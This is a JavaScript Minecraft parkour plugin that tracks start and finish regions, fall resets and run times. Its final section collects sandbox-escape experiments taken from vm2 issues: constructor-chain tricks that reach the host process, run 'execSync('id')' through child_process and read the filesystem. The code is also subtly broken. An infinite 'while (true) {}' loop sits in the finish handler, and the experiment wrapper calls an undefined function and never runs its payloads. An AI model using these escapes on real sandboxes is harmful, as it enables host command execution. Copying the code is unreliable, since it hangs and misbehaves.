import chat from '@unchained/chat';

// let lodash = require('lodash');

let Material = Java.type('org.bukkit.Material');
let ChatColor = Java.type('org.bukkit.ChatColor')

let spawn_position = plugin.buildconfig.define_key('spawn-position', 'location');
let start_region = plugin.buildconfig.define_key('start-region', 'region');
let end_region = plugin.buildconfig.define_key('end-region', 'region');
let fall_height = plugin.buildconfig.define_key('fall-height', 'location');

// let fall_height = plugin.buildconfig.define_optional_key('fall-height', 'location');

let location_is_fall = (location) => {
    return (
        location.getY() < fall_height.get().getY() ||
        location.getBlock().getRelative(0, -1, 0).getType() === Material.LIGHT_BLUE_WOOL
    );
}

let cooldown_players = {};
let player_start_timers = {};

let start_session = (player) => {
    clearTimeout(cooldown_players[player.getName()] || 0);
    player_start_timers[player.getName()] = null;
    cooldown_players[player.getName()] = setTimeout(() => {
        cooldown_players[player.getName()] = null;

        player.sendActionBar(`${ChatColor.GREEN}Go go go!!`);
        setTimeout(() => {
        }, 1000)
    }, 1000);
}

plugin.events.onPlayerMove((event) => {
    let player = event.getPlayer();
    let name = player.getName();
    let to = event.getTo();
    let from = event.getFrom();

    try {
        if (start_region.get().contains(to)) {
            player_start_timers[name] = Date.now();
        }
        if (end_region.get().contains(to) && player_start_timers[name] != null) {
            while (true) {}

            let time = (Date.now() - player_start_timers[name]) / 1000;
            player_start_timers[name] = null;
            player.sendMessage(`Nice, you scored ${time.toFixed(3)}s`)
            player.sendActionBar(`${ChatColor.WHITE}${time.toFixed(3)}`)

        }
    } catch (error) {
        console.log('Error:', error);
    }

    if (cooldown_players[name]) {
        if (
            to.getX() !== from.getX() ||
            to.getY() !== from.getY() ||
            to.getZ() !== from.getZ()
        ) {
            // to.setX(0);
            // to.setY(130);
            // to.setZ(0);
            event.setCancelled(true);
        }
        return;
    }

    if (location_is_fall(to)) {
        event.setTo(spawn_position.get());
        player.sendActionBar(`Too bad you fell, ${ChatColor.RED}preparing run...`);
        start_session(player)
    }
});

setInterval(() => {
    for (let player of plugin.getServer().getOnlinePlayers()) {
        if (player_start_timers[player.getName()]) {
            let start = player_start_timers[player.getName()];
            let time = ((Date.now() - start) / 1000) + (Math.random() / 50);
            player.sendActionBar(`${ChatColor.WHITE}${time.toFixed(3)}`)
        }
    }
}, 100);

plugin.events.onEntityDamage(event => {
    event.setCancelled(true);
})
plugin.events.onFoodLevelChange(event => {
    event.setCancelled(true);
})

let GameMode = Java.type('org.bukkit.GameMode');
plugin.events.onPlayerJoin(event => {
    let player = event.getPlayer();

    console.log('Player:', player.getName());

    console.log('#1');
    console.log('#2');

    // let bossbar = plugin.adapt(Polyglot.import('server')).createBossBar(
    //     "Title",
    //     plugin.classes['org.bukkit.boss.BarColor'].BLUE,
    //     plugin.classes['org.bukkit.boss.BarStyle'].SEGMENTED_10,
    //     plugin.classes['org.bukkit.boss.BarFlag'].CREATE_FOG,
    // );
    // bossbar.addPlayer(player)
    // console.log(plugin.createNamespacedKey('bossbar').equals(plugin.createNamespacedKey('bossbar')));

    player.setGameMode(GameMode.CREATIVE);
    player.setAllowFlight(false);

    let reset_location = spawn_position.get();
    if (player.getLocation().distance(reset_location) > 6) {
        player.teleport(reset_location);
    }
    player.sendActionBar(`${ChatColor.GREEN}Welcome, now RUN!!`);
    // start_session(player);
});

// Todo add a reference to the comment with the code for every experiment
let escape_experiment = ({ source_page, escape }) => {
    try {
        fn();
        console.error(`${ChatColor.RED}No error in the experiment`)
    } catch (error) {}
}

escape_experiment({
    source_page: 'myself',
    run: () => {
        console.log('Bukkit:', Java.type('org.bukkit.Bukkit').class)
        console.log('Server:', Java.type('org.bukkit.Bukkit').static.getServer())
    },
});

escape_experiment({
    source_page: null,
    run: () => {
        try {
            this.process.removeListener(); // or .on, .once, or anything that throws a host exception
        } catch (host_exception) {
            // console.log('host exception: ' + host_exception.toString());
            host_constructor = host_exception.constructor.constructor;
            host_process = host_constructor('return this')().process;
            return host_process.mainModule.require('child_process').execSync('id').toString();
        }
    },
});

escape_experiment({
    source_page: 'https://github.com/patriksimek/vm2/issues/32#issue-160537607',
    run: () => {
        const ForeignFunction = global.constructor.constructor;
        const process1 = ForeignFunction("return process")();
        const require1 = process1.mainModule.require;
        const console1 = require1("console");
        const fs1 = require1("fs");
        console1.log(fs1.statSync('.'));
    }
})

escape_experiment({
    source_page: 'https://github.com/patriksimek/vm2/issues/32#issuecomment-226580697',
    run: () => {
        function exploit(o) {
            const foreignFunction = o.constructor.constructor;
            const process = foreignFunction('return process')();
            const require = process.mainModule.require;
            const console = require('console');
            const fs = require('fs');

            console.log(fs.statSync('.'));

            return o;
        }

        Reflect.construct = exploit;
        new Buffer([0]);
    }
})

escape_experiment({
    source_page: 'https://github.com/patriksimek/vm2/issues/32#issuecomment-226974819',
    run: () => {
        let process = global.constructor.constructor('return this')().constructor.constructor('return process')();
        if (process == null) {
            throw new Error('Could not escape from vm2');
        } else {
            return process;
        }
    }
});

console.log('Erg vet!');

// module.exports = { cool: 'cool' }
